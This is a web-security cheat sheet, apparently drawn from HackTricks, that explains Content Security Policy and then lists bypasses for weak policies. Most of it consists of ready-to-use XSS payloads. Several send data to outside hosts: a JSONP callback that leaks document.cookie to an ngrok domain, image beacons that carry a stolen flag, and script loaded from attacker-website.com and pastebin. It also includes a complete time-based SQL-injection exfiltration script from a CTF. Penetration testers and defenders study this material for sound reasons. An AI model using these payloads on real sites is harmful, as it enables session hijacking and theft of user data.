Content Security Policy CSP Bypass
What is CSP
Content Security Policy or CSP is a built-in browser technology which helps protect from attacks such as cross-site scripting (XSS). It lists and describes paths and sources, from which the browser can safely load resources. The resources may include images, frames, javascript and more. Here is an example of allowing resource from the local domain (self) to be loaded and executed in-line and allow string code executing functions like eval, setTimeout or setInterval:

Content Security Policy is implemented via response headers or meta elements of the HTML page. The browser follows the received policy and actively blocks violations as they are detected.

Implemented via response header:

1
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
Implemented via meta tag:

1
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
Headers
Content-Security-Policy
Content-Security-Policy-Report-OnlyThis one won’t block anything, only send reports (use in Pre environment).
Defining resources
CSP works by restricting the origins that active and passive content can be loaded from. It can additionally restrict certain aspects of active content such as the execution of inline javascript, and the use of eval().

```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /__cspreport__
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```

Directives
script-src: This directive specifies allowed sources for JavaScript. This includes not only URLs loaded directly into elements, but also things like inline script event handlers (onclick) and XSLT stylesheets which can trigger script execution.
default-src: This directive defines the policy for fetching resources by default. When fetch directives are absent in CSP header the browser follows this directive by default.
Child-src: This directive defines allowed resources for web workers and embedded frame contents.
connect-src: This directive restricts URLs to load using interfaces like fetch, websocket, XMLHttpRequest
frame-src: This directive restricts URLs to which frames can be called out.
frame-ancestors: This directive specifies the sources that can embed the current page. This directive applies to , , , and tags. This directive can’t be used in tags and applies only to non-HTML resources.
img-src: It defines allowed sources to load images on the web page.
font-src: directive specifies valid sources for fonts loaded using @font-face.
manifest-src: This directive defines allowed sources of application manifest files.
media-src: It defines allowed sources from where media objects like , and can be loaded.
object-src: It defines allowed sources for the <object>, <embed>, and <applet> elements elements.
base-uri: It defines allowed URLs which can be loaded using element.
form-action: This directive lists valid endpoints for submission from tags.
plugin-types: It defines limits the kinds of mime types a page may invoke.
upgrade-insecure-requests: This directive instructs browsers to rewrite URL schemes, changing HTTP to HTTPS. This directive can be useful for websites with large numbers of old URL’s that need to be rewritten.
sandbox: sandbox directive enables a sandbox for the requested resource similar to the sandbox attribute. It applies restrictions to a page’s actions including preventing popups, preventing the execution of plugins and scripts, and enforcing a same-origin policy.
Sources
*: This allows any URL except data: , blob: , filesystem: schemes
self: This source defines that loading of resources on the page is allowed from the same domain.
data: This source allows loading resources via the data scheme (eg Base64 encoded images)
none: This directive allows nothing to be loaded from any source.
unsafe-eval: This allows the use of eval() and similar methods for creating code from strings. This is not a safe practice to include this source in any directive. For the same reason it is named as unsafe.
unsafe-hashes: This allows to enable specific inline event handlers.
unsafe-inline: This allows the use of inline resources, such as inline elements, javascript: URLs, inline event handlers, and inline elements. Again this is not recommended for security reasons.
nonce: A whitelist for specific inline scripts using a cryptographic nonce (number used once). The server must generate a unique nonce value each time it transmits a policy.
sha256-<hash>: Whitelist scripts with an specific sha256 hash
Unsafe Scenarios
‘unsafe-inline’
1
Content-Security-Policy: script-src https://google.com 'unsafe-inline'; 
Working payload: "/><script>alert(1);</script>

‘unsafe-eval’
1
Content-Security-Policy: script-src https://google.com 'unsafe-eval'; 
Working payload: <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>

Wildcard
1
Content-Security-Policy: script-src 'self' https://google.com https: data *; 
Working payload:

1
2
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
Lack of object-src and default-src
1
Content-Security-Policy: script-src 'self' ;
Working payloads:

1
2
3
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
File Upload + ‘self’
Content-Security-Policy: script-src 'self';  object-src 'none' ; 
If you can upload a JS file you can bypass this CSP:

Working payload:

1
"/>'><script src="/uploads/picture.png.js"></script>
However, it’s highly probable that the server is validating the uploaded file and will only allow you to upload determined type of files.

Moreover, even if you could upload a JS code inside a file using a extension accepted by the server (like: script.png) this won’t be enough because some servers like apache server selects MIME type of the file based on the extension and browsers like Chrome will reject to execute Javascript code inside something that should be an image. “Hopefully”, there are mistakes. For example, from a CTF I learnt that Apache doesn’t know the .wave extension, therefore it doesn’t serve it with a MIME type like audio/*.

From here, if you find a XSS and a file upload, and you manage to find a misinterpreted extension, you could try to upload a file with that extension and the Content of the script. Or, if the server is checking the correct format of the uploaded file, create a polyglot (some polyglot examples here).

Third Party Endpoints + ‘unsafe-eval’
1
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval'; 
Load a vulnerable version of angular and execute arbitrary JS:

1
2
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>
Other payloads:


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
  
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
 <div ng-app ng-csp>
  {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
 </div>
  
"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
 
"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
Third Party Endpoints + JSONP
Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none';
Scenarios like this where script-src is set to self and a particular domain which is whitelisted can be bypassed using JSONP. JSONP endpoints allow insecure callback methods which allow an attacker to perform XSS, working payload:

1
2
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
JSONBee contains a ready to use JSONP endpoints to CSP bypass of different websites.

The same vulnerability will occur if the trusted endpoint contains an Open Redirect, because if the initial endpoint is trusted, redirects are trusted.

Folder path bypass
If CSP policy points to a folder and you use %2f to encode “/”, it is still considered to be inside the folder. All browsers seem to agree on that.
This leads to a possible bypass, by using “%2f..%2f” if server decodes it. For example, if CSP allows http://example.com/company/ you can bypass the folder restriction and execute: http://example.com/company%2f..%2fattacker/file.js

Online Example: https://jsbin.com/werevijewa/edit?html,output

Iframes JS execution
1
Content-Security-Policy: default-src 'self'; connect-src 'self'; script-src 'self';
Working payloads:

1
2
3
4
5
6
7
#This one requires the data: scheme to be allowed
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
#This one injects JS in a jsonp endppoint
<iframe srcdoc='<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
 
* sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
AngularJS events
Depending on the specific policy, the CSP will block JavaScript events. However, AngularJS defines its own events that can be used instead. When inside an event, AngularJS defines a special $event object, which simply references the browser event object. You can use this object to perform a CSP bypass. On Chrome, there is a special property on the $event/event object called path. This property contains an array of objects that causes the event to be executed. The last property is always the window object, which we can use to perform a sandbox escape. By passing this array to the orderBy filter, we can enumerate the array and use the last element (the window object) to execute a global function, such as alert(). The following code demonstrates this:

1
2
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
AngularJS and whitelisted domain
1
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
If the application is using angular JS and scripts are loaded from a whitelisted domain. It is possible to bypass this CSP policy by calling callback functions and vulnerable class. For more details visit this awesome git repo.

Working payloads:

1
2
"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
Bypass CSP with dangling markup
Read how here.

‘unsafe-inline’; img-src *; via XSS
1
default-src 'self' 'unsafe-inline'; img-src *;
'unsafe-inline' means that you can execute any script inside the code (XSS can execute code) and img-src * means that you can use in the webpage any image from any resource.

You can bypass this CSP exfiltrating the data via images (in this occasion the XSS abuses a CSRF where a page accessible by the bot contains a SQLi, and extract the flag via an image):

1
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
From: https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle

You could also abuse this configuration to load javascript code inserted inside an image. If for example, the page allows to load images from twitter. You could craft an special image, upload it to twitter and abuse the “unsafe-inline” to executea JS code (as a regular XSS) that will load the image, extract the JS from it and execute it: https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/

img-src *; via XSS (iframe) – Time attack
Notice the lack of the directive 'unsafe-inline'
This time you can make the victim load a page in your control via XSS with a <iframe. This time you are going to make the victim access the page from where you want to extract information (CSRF). You cannot access the content of the page, but if somehow you can control the time the page needs to load you can extract the information you need.

This time a flag is going to be extracted, whenever a char is correctly guessed via SQLi the response takes more time due to the sleep function. Then, you will be able to extract the flag:

```


<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
    x = escape(x.replace(/_/g, '\\_'));
    return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`; 
}
 
function gen2(x) {
    x = escape(x);
    return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}
 
async function query(word, end=false) { 
    let h = performance.now();
    f.location = (end ? gen2(word) : gen(word));
    await new Promise(r => {
        g.onload = r; 
    });
    let diff = performance.now() - h;
    return diff > 300;
}
 
let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'
 
async function run() {
    let prefix = 'nn9ed{';
    while (true) {
        let i = 0;
        for (i;i<alphabet.length;i++) {
            let c = alphabet[i];
            let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
            console.log(prefix, c, t);
            if (t) {
                console.log('FOUND!')
                prefix += c;
                break;
            }
        }
        if (i==alphabet.length) {
            console.log('missing chars');
            break;
        }
        let t = await query(prefix+'}', true);
        if (t) {
            prefix += '}';
            break;
        }
    }
    new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
    console.log(prefix);
}
 
run();
</script>
```

CVE-2020-6519
1
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
Policy Injection
Research: https://portswigger.net/research/bypassing-csp-with-policy-injection****

Chrome
If a parameter sent by you is being pasted inside the declaration of the policy, then you could alter the policy in some way that makes it useless. You could allow script ‘unsafe-inline’ with any of these bypasses:

1
2
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
Because this directive will overwrite existing script-src directives.
You can find an example here: http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E

Edge
In Edge is much simpler. If you can add in the CSP just this: ;_ Edge would drop the entire policy.
Example: http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E

Checking CSP Policies Online
https://csp-evaluator.withgoogle.com/
https://cspvalidator.org/
Automatically creating CSP
https://csper.io/docs/generating-content-security-policy

References
https://hackdefense.com/blog/csp-the-how-and-why-of-a-content-security-policy/

http://lcamtuf.coredump.cx/postxss/

https://medium.com/bugbountywriteup/content-security-policy-csp-bypass-techniques-e3fa475bfe5d

https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy\#allowed-data-scheme

Ref: https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass

Share this:
